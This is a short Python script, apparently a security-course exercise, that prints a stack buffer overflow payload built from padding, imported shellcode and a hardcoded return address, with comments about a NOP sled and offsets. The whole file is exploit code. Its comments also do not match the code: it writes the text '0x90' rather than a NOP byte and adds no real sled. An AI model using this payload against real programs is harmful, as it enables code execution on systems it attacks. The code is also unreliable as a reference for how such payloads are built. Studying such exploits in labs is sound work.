#!/usr/bin/env python3

import sys

from shellcode import shellcode
#sys.stdout.buffer.write(b'A'*10)
sys.stdout.buffer.write(b'0x90' + (0x70-56)*b'A'+shellcode+(8*b'A')+(0x7ffffff6d110).to_bytes(8,"little"))
# adding a big noop sled before the shellcode so the return address doesn’t have to be super precise
# can no longer write the return address into it bc we don't know the exact offset
# aren't subtracting 54 bc we have 2 byte noop --> subtracting 56
# need to add code so that no matter how the stack organizes itself, I am always returning the entire shellcode
# writing to the address of the shellcode